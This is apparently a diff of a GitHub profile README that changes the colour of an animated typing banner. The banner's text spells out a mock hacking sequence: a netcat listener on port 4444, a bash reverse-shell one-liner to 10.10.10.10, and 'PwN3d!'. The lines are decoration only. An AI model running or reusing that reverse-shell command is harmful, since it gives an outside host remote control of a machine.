@@ -2,7 +2,8 @@
 
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=realshak7781&label=Profile%20views&color=0e75b6&style=flat" alt="realshak7781" /> </p>
 
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=1E90FF&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BrealShak7781%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;realShak7781%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;realShak7781" alt="Typing SVG" /></a>
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=00FF00&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BrealShak7781%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;realShak7781%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;realShak7781" alt="Typing SVG" /></a>
+
 
 
 
